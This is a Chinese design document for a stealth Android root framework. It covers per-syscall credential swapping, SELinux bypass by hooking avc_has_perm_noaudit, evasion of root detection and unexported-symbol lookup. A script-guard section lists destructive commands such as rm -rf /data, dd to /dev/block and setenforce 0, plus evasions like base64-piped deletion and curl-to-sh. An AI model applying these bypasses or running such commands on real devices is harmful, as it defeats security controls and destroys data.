# Umbral（影核）

> 第 4 代 Android root 框架 —— **影子权限 + 无状态授权**
>
> 最后更新：2026-11-10 · 状态：**核心机制已验证成立**

---

## 一、项目身份

| 项 | 值 |
|---|---|
| 中文名 | 影核 |
| 英文名 / 桌面显示 | `Umbral` |
| 包名 | `io.umbral` |
| 缩写 | UR |
| 管理器版本 | 0.7.0 |
| 内核模块版本 | 0.9.0-selinux |
| 定位 | 第 4 代 root 框架（相对 Magisk / KernelSU / APatch 为前三代） |

**命名约定（重要）**

- 桌面标签固定为英文 `Umbral`：`app_name` **只**在 `values/` 里定义，`values-zh-rCN` 等语言包里不定义 `app_name`。这样系统 locale 切到任何语言，launcher 上都显示 `Umbral`。
- 应用内标题由 `display_name` 按语言变化：中文「影核」、日文「Umbral」、韩文「Umbral」、俄文「Umbral」。
- **内核协议标识符不改名**：`sk_root.ko`、`sk_init`、`/proc/sk`、`sk_hello.ko` 这些必须与 `sk_init_log.c` 和模块源码保持一致，改名会断链。

---

## 二、核心设计

### 2.1 影子权限（Shadow Privilege）

**问题**：前三代 root 方案都会产生真实的 uid=0 进程，`ps -A` 一眼可见，这是被检测的根源。

**解法**：进程 uid 永远保持原值，只在**单个 syscall 的窗口内**临时替换 cred。

```
App 调用 open("/data/system/packages.list")
  │
  ├─ entry hook（syscall 入口）
  │    ├─ 这个 syscall 敏感吗？           不敏感 → 直接放行，零开销
  │    ├─ 进程有资格提权吗？              内核线程/无 mm → 拒绝
  │    ├─ 内存里有正确 token 吗？         没有 → 拒绝（denied++）
  │    └─ override_creds(sk_root_cred)    ← 窗口打开
  │
  ├─ 内核按 root 执行：DAC 通过 + SELinux 放行
  │
  └─ return hook（syscall 返回）
       └─ revert_creds(old)               ← 窗口关闭
```

**结果**：文件读到了，`ps` 里从头到尾没有 uid=0 的进程。

### 2.2 无状态授权（Stateless Authorization）

**问题**：Magisk 存 `/data/adb/magisk.db`、KSU 存 `/data/adb/ksu/` 白名单，都是磁盘上的文件，可被检测。

**解法**：内核不存任何名单。判断依据是**目标进程自己地址空间里的一块内存**。

```
约定地址   0x1000000000        （64 GB，Android 可 mmap 的上限约 256 GB）
内容       32 字节 token
派生方式   token = f(uid, 编译期密钥)
```

- 内核只做一件事：读那块地址，和自己按 `current_uid()` 派生出的值比。
- 同一个 uid 永远得到同一个 token（幂等），所以 App 可以缓存。
- 内核不记"发过谁"、"谁被授权过" —— 模块卸载重装，状态不受影响。
- 管理器用 root 读 `/proc/sk/token` 拿到 token，注入目标进程 → 该进程自动获得影子权限。

**实测的三个 uid token 互不相同：**

```
uid=0      3de381d2476fce7794b032c1a6949398a091713f16ea2d1f4fdbd95b14616984
uid=2000   e307690f98a0698bc5b17db71b6ec0f3c6c9cea6f115923ecde17a99054c8900
uid=10123  9d475dceaad62c96d4b19d47864568c8a33b16ff07a45b72eab7219e9e70961e
```

### 2.3 与前三代的对比

| | Magisk | KernelSU | APatch | **Umbral** |
|---|---|---|---|---|
| 实现方式 | patch ramdisk + magiskd | LKM / builtin | KernelPatch inline hook | LKM |
| 提权粒度 | 进程级（su 进程） | 进程级（su 进程） | 进程级 | **syscall 级** |
| root 进程 | 有，uid 0 可见 | 有，uid 0 可见 | 有 | **无** |
| 授权记录 | 磁盘文件 | 磁盘文件 | 磁盘文件 | **内存 token，无痕** |
| App 用法 | `exec("su -c ...")` | `exec("su -c ...")` | 同 | **直接 `open()`** |
| SELinux | 改策略文件 | `setup_selinux()` + `ksud sepolicy` | hook | **窗口内 hook `avc_has_perm_noaudit`** |

**最关键的区别是「提权粒度」和「root 进程」两行。** 前两者必须 fork 一个 uid=0 的 su 进程；Umbral 的 App 直接调 `open()` 就行，内核在那一个 syscall 的窗口里换 cred。

> 但要说清楚：**如果 App 自己 `execve("/system/bin/sh")`，新进程仍然是 uid=0**，这和 KSU 没有区别。影子权限的价值体现在「细粒度特权操作」上，不在「常驻 root shell」上。

---

## 三、内核模块技术实现

源码：`E:\sk-root\src\sk\sk_root.c`（约 620 行）

### 3.1 五个 hook 点

| 符号 | 作用 | 必需 |
|---|---|---|
| `invoke_syscall` | syscall 总入口，提权窗口开在这 | ✅ 核心 |
| `__traceiter_sys_enter` | 备用入口（`invoke_syscall` 不存在时） | 备选 |
| `selinux_inode_permission` | open/access 的 MAC 检查 | 优化 |
| `selinux_file_permission` | read/write 的 MAC 检查 | 优化 |
| `selinux_file_open` | open 的第二道 MAC 检查 | 优化 |
| **`avc_has_perm_noaudit`** | **SELinux 总判定，capability 检查走这条** | ✅ **决定性** |

### 3.2 敏感 syscall 表（45 项）

用 `__NR_*` 宏而不是硬编码数字（ARM64 与 x86 编号完全不同）：

```
执行      execve execveat
进程控制  ptrace kill tkill tgkill rt_sigqueueinfo rt_tgsigqueueinfo
文件设备  ioctl openat openat2 unlinkat renameat renameat2 mkdirat mknodat
          symlinkat linkat
挂载      mount umount2 mount_setattr
属性      fchmodat fchmod fchownat fchown
身份      setuid setgid setreuid setregid setresuid setresgid
          setfsuid setfsgid capset
跨进程    process_vm_readv process_vm_writev
模块内核  init_module finit_module delete_module kexec_load reboot
系统级    settimeofday clock_settime sethostname setdomainname
```

**普通 syscall（read/write/mmap/brk/futex…）不进表**，在 entry 里只付一次线性查表，立即返回跳过。

### 3.3 `/proc/sk/` 接口

| 文件 | 内容 |
|---|---|
| `version` | 模块版本 |
| `mode` | 工作模式 |
| `status` | 错误码，0 = 正常 |
| `backend` | 实际使用的 syscall hook |
| `stats` | seen / elevated / reverted / denied / lsm_seen / lsm_bypass |
| `token` | **当前进程 uid 对应的 token（64 hex 字符）** |
| `selftest` | 结构体偏移、hook 位图、cred 指针自检 |

**`stats` 的健康判据**：`elevated` 必须等于 `reverted`。不相等 = cred 泄漏。

---

## 四、六个坑（全部实测撞出来，没有一条是猜的）

### 坑 1：`struct module` 布局错位 16 字节 —— 所有模块加载崩溃的真因

**症状**：所有静态检查通过（CRC、vermagic、`__this_module` 大小、kCFI、签名、段结构），一 `insmod` 就 panic / bootloop。最小模块（只有一行 `pr_info`）也崩。

**根因**：设备内核 `CONFIG_DEBUG_INFO_BTF_MODULES=y`，而我们的编译树为了绕开 `Makefile.modfinal:62 libbpf: failed to find '.BTF' ELF section in vmlinux` 把它关掉了。

```c
// ACK module.h:514-517
#ifdef CONFIG_DEBUG_INFO_BTF_MODULES
    unsigned int btf_data_size;    // 4 + 4 padding
    void *btf_data;                // 8
#endif                             // 合计 16 字节
```

`sizeof(struct module)` 仍是 1536（后面有 padding 吸收），但**从 `source_list` 开始所有字段前移 16 字节**。

**实测对比：**

| 字段 | 修正前 | 修正后 | 设备 BTF |
|---|---|---|---|
| `init` | 392 | 392 | 392 ✅ |
| `btf_data` | 不存在 | 1328 | 1328 ✅ |
| `source_list` | 1416 | 1432 | 1432 ✅ |
| `exit` | **1448** | **1464** | **1464** ✅ |
| `refcnt` | 1456 | 1472 | 1472 ✅ |

**后果**：内核写 `mod->btf_data` 实际写进了我们的 `jump_entries`；内核读 `mod->exit` 读到的是链表指针。

**修法**（两条同时做）：
1. `.config` 打开 `CONFIG_DEBUG_INFO=y` / `DEBUG_INFO_DWARF5=y` / `DEBUG_INFO_BTF=y` / `DEBUG_INFO_BTF_MODULES=y`，关掉 `DEBUG_INFO_REDUCED`
2. 给 `scripts/Makefile.modfinal` 加 `SKIP_MODULE_BTF` 开关，编译时只跳过 BTF 段生成，保持结构布局正确

**验证标准**：`readelf -rW sk_root.ko | grep -A3 this_module | grep cleanup_module` 必须是 `0x5b8`（= 1464）。

**⚠ 改完 config 必须重生成 autoconf.h**，否则 `error: no member named 'btf_data'`：

```bash
rm -f include/config/auto.conf include/config/auto.conf.cmd include/generated/autoconf.h
make syncconfig
```

### 坑 2：`kretprobe` 的 `entry_handler` 返回值语义是反的

**症状**：`reverted` 永远是 0（cred 泄漏）；SELinux 在提权窗口外也被放行（安全漏洞）。

**真相**（`kernel/kprobes.c`）：

```c
if (rp->entry_handler && rp->entry_handler(ri, regs)) {
        freelist_add(&ri->freelist, &rp->freelist);
        return 0;                        // 返回【非 0】→ 不安装 return handler
}
arch_prepare_kretprobe(ri, regs);        // 返回【0】  → 安装 return handler
```

**返回 0 才安装 return handler，返回非 0 是跳过。** 这和「0 表示失败」的直觉正好相反。

**后果**：
- 该 revert 时没安装 return → `revert_creds` 从不执行 → cred 泄漏
- 不该放行时安装了 return → 窗口外也改返回值 → SELinux 误放行 711 次

**正确写法**：

```c
static int sk_hook_entry(...)
{
        if (!sk_is_sensitive(nr))
                return 1;       /* 1 = 跳过，零开销 */
        ...
        d->old = sk_on();
        d->did = true;
        return 0;               /* 0 = 安装 return，必须收尾 */
}
```

**验证方法**：窗口外应满足 `lsm_e_call` 增长但 `lsm_r_call == 0`、`lsm_bypass == 0`。

### 坑 3：`prepare_kernel_cred(NULL)` 在 6.5+ 返回 NULL

**症状**：`insmod` 报 `Out of memory`，dmesg 显示 `prepare_kernel_cred failed`。

**真相**：

```c
struct cred *prepare_kernel_cred(struct task_struct *daemon)
{
        if (WARN_ON_ONCE(!daemon))     // 6.5 起不再允许 NULL
                return NULL;
        ...
}
```

**修法**：传一个真实 task。`init_task`（PID 0，swapper）的 cred 就是最初的 `init_cred`：

```c
sk_root_cred = prepare_kernel_cred(&init_task);
```

`init_task` 在设备上是导出的（CRC `0x5e840913`）。

### 坑 4：Android 的 mmap 地址上限约 256 GB

**症状**：`mmap(0x700000000000, ...)` 返回 `ENOMEM`。

**实测结果**：

| 地址 | 大小 | 结果 |
|---|---|---|
| `0x700000000000` | 123 TB | FAIL |
| `0x10000000000` | 1 TB | FAIL |
| `0x4000000000` | 256 GB | OK |
| `0x2000000000` | 128 GB | OK |
| **`0x1000000000`** | **64 GB** | **OK（采用）** |

**采用值 `0x1000000000`**：够高，远离 App 常规布局（代码 `0x12C00000`、库 `0x7xxxxxxx`、栈 `0x7ffxxxxxxx`）。

### 坑 5：SELinux 是 DAC 之外的第二道墙

**症状**：`override_creds` 生效了（uid=0、cap 全开），但 `open()` 仍然 `EACCES`。

**真相**：Android 权限是 **DAC + MAC 双重**。`override_creds` 只改 uid/gid/capabilities，不改 SELinux 安全域。

**判断方法**：看审计日志的 `scontext`：

```
avc: denied { read open } path="/data/system/packages.list"
     scontext=u:r:kernel:s0 tcontext=u:object_r:packages_list_file:s0 permissive=0
```

**注意**：`prepare_kernel_cred(&init_task)` 得到的 cred，安全域是 **`u:r:kernel:s0`**（来自 `init_cred`），不是 `su` 域。这一条对后续排查非常重要。

### 坑 6：capability 检查走 `avc_has_perm_noaudit`，不是 `avc_has_perm`

**症状**：hook 了 `avc_has_perm` 且 `lsm_bypass == 0`（说明它本来就返回 0），但 `dac_override` 依旧被拒。

**真相**（`security/selinux/hooks.c` 的 `cred_has_capability`）：

```c
rc = avc_has_perm_noaudit(sid, sid, sclass, av, 0, &avd);   // ← 直接调 _noaudit
if (!(opts & CAP_OPT_NOAUDIT)) {
        int rc2 = avc_audit(sid, sid, sclass, av, &avd, rc, &ad);
        if (rc2) return rc2;
}
return rc;
```

`avc_has_perm` 只是 `_noaudit` 外面包一层审计的版本，capability 路径根本不经过它。

**修法**：hook `avc_has_perm_noaudit`（需要同时 hook，因为它才是所有检查的总落点）。

**这一条是最后一个坑。补上之后，普通进程立刻读到了 `/data/system/packages.list`。**

---

## 五、内核符号获取（未导出符号）

设备上 `avc_has_perm`、`selinux_state`、`security_hook_heads`、`kallsyms_lookup_name` 等**全部未导出**（`EXPORT_SYMBOL` 计数为 0）。

**KSU 的做法**：`ksuinit` 在 init 阶段读 `/proc/kallsyms`（那时 `kptr_restrict` 还是 0），把真实地址**预绑定**写进 `.ko` 的符号引用里，内核加载时不需要解析任何符号。

**我们的做法（更省事）**：`register_kprobe()` 是导出的，它内部用内核自己的 `kallsyms_lookup_name` 解析 `symbol_name`。

```c
struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
register_kprobe(&kp);           // kp.addr 就是那个未导出函数的真实地址
unregister_kprobe(&kp);         // 拿到即注销，不留 hook
// 之后 ((unsigned long (*)(const char *))addr)("任何符号") 都能查
```

**实测 17 个符号全部拿到**（含 `selinux_state`、`avc_has_perm`、`security_hook_heads`、`set_memory_rw`、`aarch64_insn_patch_text`）。

**⚠ 注意 KASLR**：每次重启地址都变（`ffffffe1…` → `ffffffdd…`）。**必须运行时解析，绝不能硬编码。**

**⚠ 调用未导出函数必须逐字对签名**。曾把 `kallsyms_lookup_size_offset` 的返回类型写成 `unsigned long`（实际是 `int`），ARM64 ABI 下高 32 位是垃圾值，导致崩溃。

---

## 六、设备与环境

| 项 | 值 |
|---|---|
| 机型 | RedMagic 10S Pro（NX789J） |
| SoC | Snapdragon 8 Elite（SM8750） |
| Android | 15 |
| 内核 | `6.6.30-android15-8-g54dcbfbef792-ab12368803-4k` |
| 序列号 | `SN9X769J0001234` |
| 当前 root 来源 | **KernelSU**（不是我们自己的） |

**关键内核配置**

```
CONFIG_MODVERSIONS=y              CRC 必须来自设备
CONFIG_MODULE_FORCE_LOAD 未设      删 __versions 会 ENOEXEC；清空则可
CONFIG_MODULE_SIG=y（FORCE 未设）
CONFIG_MODULE_SIG_PROTECT=y
CONFIG_STRICT_MODULE_RWX=y
CONFIG_ARM64_MODULE_PLTS 未设      1 字节填充，只读正确
CONFIG_SHADOW_CALL_STACK=y
CONFIG_ARM64_PTR_AUTH_KERNEL=y
CONFIG_ARM64_BTI_KERNEL 未设
CONFIG_DEBUG_INFO_BTF=y           ← 坑 1 的根源
CONFIG_DEBUG_INFO_BTF_MODULES=y   ← 坑 1 的根源
CONFIG_DEBUG_INFO_DWARF5=y
```

**已知无效的调试手段**：`ramoops` 的 `record_size = 0`，只有 console 后端，`/sys/fs/pstore` 永远空。`cat /dev/kmsg > file` 因缓冲丢失 panic。**pstore 这条路是死的。**

---

## 七、构建流程

```bash
# 1) 内核树（ACK android15-6.6-2024-10）必须先对齐 release 串
cd /root/gki-src/kernel
echo "6.6.30-android15-8-g54dcbfbef792-ab12368803-4k" > include/config/kernel.release
sed -i 's|#define UTS_RELEASE ".*"|#define UTS_RELEASE "6.6.30-android15-8-g54dcbfbef792-ab12368803-4k"|' \
    include/generated/utsrelease.h

# 2) 编模块（SKIP_MODULE_BTF=1 跳过 BTF 段，保留结构布局）
cd /mnt/e/sk-root/src/sk
make -C /root/gki-src/kernel M=$PWD ARCH=arm64 LLVM=1 SKIP_MODULE_BTF=1 modules

# 3) strip debug（274KB → 33KB；不 strip 会 insmod 报 Out of memory）
llvm-strip-18 --strip-debug sk_root.ko

# 4) 三项必查
readelf -SW sk_root.ko | grep -v rela | grep this_module      # 要 000600
readelf -rW sk_root.ko | grep -A3 this_module | grep cleanup  # 要 0x5b8
llvm-objdump-18 -d --section=.init.text sk_root.ko | grep -m1 .word  # 要 0x36b1c5a6
```

**编译器约束**：Clang 18.1.8 并行编译大内核会撞 `.o.tmp` 重命名竞争，**只能用 `-j4` 且关 `DEBUG_INFO*`** 时才稳。

---

## 八、当前状态

### 已验证通过

| 能力 | 证据 |
|---|---|
| `struct module` 布局 | `exit` 偏移 1464，与设备 BTF 一致 |
| 模块加载/卸载 | 5 次 insmod+rmmod 循环零崩溃 |
| `/proc/sk` 七个接口 | 全部可读 |
| token 按 uid 派生 | 三个 uid 各不相同，同 uid 幂等 |
| 敏感 syscall 识别 | 45 项表，`denied` 正常计数 |
| `kretprobe` 挂载 | `seen` 实时增长 |
| `override_creds` | `elevated` 增长，cred 实测 uid=0 + cap 全开 |
| `revert_creds` | `elevated == reverted`，零泄漏 |
| 未导出符号解析 | 17 个符号全部拿到 |
| **SELinux 放行** | `lsm_bypass` 增长，`permissive=1` |
| **影子权限端到端** | **uid=2000 的进程直接 `open("/data/system/packages.list")` 读到内容** |
| 反向验证 | 无 token / 错 token / 别人 token 全部正确拒绝 |
| 系统稳定性 | `getenforce` 仍 Enforcing，设备不崩 |

### 未完成

| 缺口 | 说明 |
|---|---|
| `/proc/sk/token` 对管理器可读 | 现在 `untrusted_app` 域读不到，需改 proc 文件 SELinux 标签或改走 `/dev` |
| boot 阶段加载 | 现在必须靠 KSU 给 root 才能 `insmod`；要独立必须刷 `init_boot` |
| 管理器侧 token 注入 | `SkBridge` 需要加「读 token → mmap 写入目标进程」的接口 |
| `sk_init_log.c` 仍加载 `/sk_hello.ko` | 应改为 `/sk_root.ko` |
| APK 里是旧模块 | assets 里是 27,720 字节的 v0.6.0，应换成 41,784 字节的 v0.9.0-selinux |
| 模块自擦除 | KPM 兼容所需 |
| L1 模块库 | `android12-5.10` / `android13-5.15` / `android14-6.1` |

---

## 九、镜像与回滚

| 文件 | md5 | 说明 |
|---|---|---|
| `kernelsu_patched.img` | `044cff82` | KSU 原版，**能开机，拿回 root** |
| `ksu_fixed_module.img` | `83994623` | 布局修正后的模块（probe2），**未刷** |
| `ksu_with_our_module.img` | `04dca53d` | **已知 bootloop，勿刷** |
| `init_boot_stock.img` | `30ae82b4` | 原厂保底 |

**救砖**：

```powershell
fastboot flash init_boot_a C:\Users\Administrator\Desktop\kernelsu_patched.img
# 保底
fastboot flash init_boot_a C:\Users\Administrator\Desktop\init_boot_stock.img
```

**验证天花板**：12 层镜像检查器给 11 PASS · 1 WARN · 0 FAIL，但它只验证结构，**覆盖不了 CFI、UFS、SELinux、AVB、厂商 bootloader**。

---

## 十、关键路径

```
E:\sk-root\
  src\sk\sk_root.c              内核模块源码（v0.9.0-selinux）
  src\sk\sk_root_sx.ko          strip 后的可用产物
  src\sk_init\sk_init_log.c     init 包装器（负责 insmod）
  src\symprobe\sk_symprobe.c    符号探测器（独立工具）
  src\utest\
    shadow_test.c               影子权限测试
    mini_probe.c                最小化诊断
    addr_probe.c                固定地址探测
  manager\                       APK 工程（build.ps1 手搓，无 gradle）
    assets\arm64-v8a\android15-6.6\sk.ko
    assets\arm64-v8a\sk_init
    java\io\umbral\
  docs\UMBRAL.md                本文档
  boot-backup\10.5.8\ksu\       镜像备份
```

---

## 十一、纪律

1. **只增不删** —— 用户写的本地化、图片、sprite 一律追加，不整行替换。认为「重复」先问。
2. **备份 ≠ 许可。**
3. **覆盖 `.gfx` / `.yml` 前先确认里面已有的 sprite / key 不会丢。**
4. **每次只改一个变量，改完立刻验证。**
5. **「静态检查全过」≠「能加载」** —— 结构对了覆盖不了行为。
6. **不猜，实测。** 今天六个坑里，没有一个是靠推理发现的，全是撞出来的。

---

## 十二、启动器与脚本规范

这一节是给**写脚本的人**看的。要在影核的内置启动器里跑，按这个规范来能省掉大部分坑。

### 12.1 启动器是什么

应用底部导航第 6 个标签（默认隐藏，设置里可开）。作用：

```
选择 .sh / .ko 文件 → 复制进应用私有目录 → 在「内置终端」里边运行边交互
```

**它不是 shell 模拟器，是一个带 UI 的执行环境**：脚本的输出实时显示，用户的输入通过管道送进脚本的 stdin。

### 12.2 硬性要求

| 项 | 要求 | 原因 |
|---|---|---|
| 扩展名 | 只能是 `.sh` 或 `.ko` | 其它类型直接拒绝 |
| 换行 | **LF（`\n`）**，不要 CRLF | CRLF 会让 `sh` 报 `not found` |
| 首行 | 建议 `#!/system/bin/sh` | 便于别人读懂，实际由我们指定解释器 |
| 编码 | UTF-8，不带 BOM | 带 BOM 会让首行命令解析失败 |
| 体积 | 建议 < 256 KB | 超过 512 KB 的部分扫描不到 |
| `.ko` | **当前不能执行** | 加载模块需要 root，等内核通道就位 |

### 12.3 输入：从 stdin 读，不要用 getevent

**这是最重要的一条。**

```sh
# ✅ 推荐：从 stdin 读
echo "按 1 继续，按 2 退出："
read CHOICE

# ❌ 不可用：读 /dev/input 或 getevent
getevent -lc 1 /dev/input/event2    # 普通应用没有权限，一定失败
```

原因：应用跑在普通 uid 下，读不到 `/dev/input/*`。而 stdin 是通的——用户在终端里敲的字、点的快捷按键，都会送到脚本的 stdin。

**要在界面上给用户提示。** 终端会把输出原样显示，所以这样写体验最好：

```sh
echo "─────────────────────────────"
echo "  1) 开启功能"
echo "  2) 关闭功能"
echo "  3) 退出"
echo "─────────────────────────────"
echo "请输入序号后回车："
read N
```

用户看到提示，点快捷按键条上的 `1` / `2` / `3`，或者直接打字 + 发送。

### 12.4 输出约定

```sh
# ✅ 纯文本
echo "正在处理..."

# ❌ 不要用 ANSI 转义
echo -e "\033[32m绿色\033[0m"     # TextView 会显示成乱码字符
printf "\033[2J\033[H"            # 清屏转义无效

# ❌ 不要试图画进度条覆盖同一行
printf "\r进度 %d%%" $N           # 每帧会变成新的一行，刷屏

# ✅ 要更新进度就每隔一段打一行
echo "进度 $N%"
```

脚本启动时我们设了 `TERM=dumb`，就是为了让依赖终端能力的程序退化成纯文本输出。

### 12.5 环境

```
PATH   = /system/bin:/system/xbin:/vendor/bin
HOME   = 脚本所在目录
PWD    = 脚本所在目录（应用私有：/data/data/io.umbral/files/launcher）
TERM   = dumb
uid    = 应用 uid（当前没有 root）
```

**不要假设有 root。** 现在脚本能做的只有它自己权限内的事。等影子权限打通之后，同一份脚本才会真的拿到特权——所以脚本应当：

1. 先自检能力，不支持就体面退出
2. 不要硬编码 `/data/data/<别人的包名>` 这种路径，先用 `[ -r ... ]` 探一下

```sh
if [ ! -r /data/system/packages.list ]; then
    echo "当前没有足够权限，请先在影核里给本脚本授权"
    exit 1
fi
```

### 12.6 结束原因与退出码

终端不再只显示「代码 N」，而是区分五种情况：

| 结束原因 | 显示 | 颜色 |
|---|---|---|
| 退出码 0 | 正常结束 | 绿 |
| 退出码 N（1~128） | 已退出（代码 N） | 红 |
| 退出码 > 128 | 被信号 N-128 终止（Unix 惯例：128+信号号） | 红 |
| 用户点停止 | 已停止 | 绿 |
| 被安全守卫拦下 | 已阻止执行 | 红 |

**⚠ 退出码 0 不等于没出错。** 脚本常见写法是「这条命令失败了，后面还有 echo」，最后 `exit 0`。所以终端会**额外扫输出**，命中特征就补一段「诊断」：

```
诊断
· 检测到权限被拒绝。常见原因：当前还没有 root / 影子权限，或目标文件属于别的应用。（共 1 处拒绝）
· 有命令或路径不存在，请检查脚本里的命令名和路径。（共 1 处拒绝）
```

匹配的特征串：

```
Permission denied / Operation not permitted / EACCES / EPERM
No such file or directory / command not found / not found
```

所以脚本要**如实返回退出码**：`exit 1` 比 `exit 0` 有用得多。

### 12.7 安全守卫（ScriptGuard）

执行前会静态扫一遍脚本内容。命中规则分两级：

**致命（直接拒绝，不给运行机会）**

```
rm -rf / 或 /data /system /vendor /product /odm /boot /persist /efs /metadata
rm ... /dev/block
dd ... of=/dev/block 或 of=/data /system /boot
mkfs / mke2fs / make_ext4fs / make_f2fs / mkswap
wipe data / all / system
> /dev/block/
mount -o remount,rw /
setenforce 0
> /proc/sysrq-trigger
reboot recovery / bootloader / edl
fork 炸弹 ((:(){ :|:& };:))
```

**警告（列出后需用户点「仍要执行」）**

```
rm -rf <任意路径>
rm -f <任意路径>
chmod -R / chown -R
mv ../data|system|vendor 下的内容
> /data|system|vendor 下的文件
```

注释行（以 `#` 开头）不参与匹配——注释里写「不要 rm -rf /data」不该被拦。

### 12.8 守卫的边界（必须知道）

**它是静态文本匹配，不是沙箱。**

拦不住的：

```sh
P=/da; rm -rf ${P}ta              # 运行时拼路径
echo "cm0gLXJmIC9kYXRh" | base64 -d | sh   # 混淆后执行
curl http://x/y.sh | sh           # 远程下载执行
通过别的程序间接删除                # 例如调用一个有删除功能的二进制
```

**真正的运行时拦截要在内核里 hook `do_unlinkat` / `do_rmdir`，发现命中保护路径就直接把进程杀掉。** 那是模块该做的活儿，需要 root 通道，当前版本没有。

所以定位是：**第一道闸，不是唯一一道闸。** 别把它当安全保证。

### 12.9 脚本模板

```sh
#!/system/bin/sh
#
# 影核启动器脚本模板
#
# 要点：
#   1. 输入从 stdin 读，不要用 getevent
#   2. 输出纯文本，不要 ANSI 转义
#   3. 先自检权限，不支持就退出
#   4. 结尾明确 exit

set -u                    # 用了未定义变量就报错，早发现比晚发现好

echo "=== 我的脚本 ==="
echo "uid=$(id -u)"

# 能力自检
if [ ! -r /data/system/packages.list ]; then
    echo ""
    echo "当前没有足够权限。"
    echo "请先在影核的「影子用户」里授权后重试。"
    exit 1
fi

echo ""
echo "  1) 开始"
echo "  2) 退出"
echo ""
echo "请输入序号后回车："

read N

case "$N" in
    1)
        echo "开始处理..."
        # 干活
        echo "完成"
        ;;
    2)
        echo "已退出"
        exit 0
        ;;
    *)
        echo "无效输入: [$N]"
        exit 2
        ;;
esac

exit 0
```

### 12.10 终端界面能力

| 功能 | 位置 | 说明 |
|---|---|---|
| 实时输出 | 上方大区域 | 等宽字体，自动滚到底；手动上翻时不打断 |
| 文本输入 | 底部输入框 | 回车即发送，**发完保持焦点**，不用再点一次 |
| 快捷粘贴 | 输入框右侧「粘贴」 | 灌进输入框，可改完再发 |
| 快捷按键 | 输入框上方一排 | `⏎ 1 2 3 y n Esc Ctrl+C`，点一下直接送 |
| 停止 | 右上角红色按钮 | 先 `destroy`，200ms 不退则 `destroyForcibly` |
| 复制全部 / 清空 / 保存日志 | **长按输出区** | 日志存 `files/logs/term_<时间戳>.log` |
| 保持屏幕常亮 | 自动 | 脚本等输入时不会息屏 |
| 输出上限 | 200 K 字符 | 超出丢弃最早的部分，防内存爆 |
| 结束诊断 | 自动 | 见 12.6，退出码 0 也会报错 |

### 12.11 文件管理（启动器列表的 ⋮ 菜单）

每一项右侧三个点：

| 菜单项 | 作用 |
|---|---|
| **权限** | 显示当前 `0755 rwxr-xr-x`，可改成 0700/0755/0644/0600/0750/0777 |
| **重命名** | 只改名字，不允许带 `/`（防目录穿越） |
| **查看内容** | 内置文本查看器，最多读 64 KB，等宽字体、可选中 |
| **复制路径** | 复制绝对路径到剪贴板 |
| **移除** | 删除文件（长按整行也是这个） |

列表项本身会显示 `大小 · 时间 · 权限`，一眼能看出脚本有没有可执行位。

**权限改的是真实的三种身份位。** 用 `chmod` 命令而不是 `File.setExecutable()` —— 后者只能改属主那三位，也没法一次设成 700/755 这种组合。

注意：这些文件都在应用私有目录，**group/other 位实际不起作用**（别的应用进不来）。给这些档位主要是让用户能对照 MT 管理器的习惯，以及为将来把脚本挪到共享目录留余地。

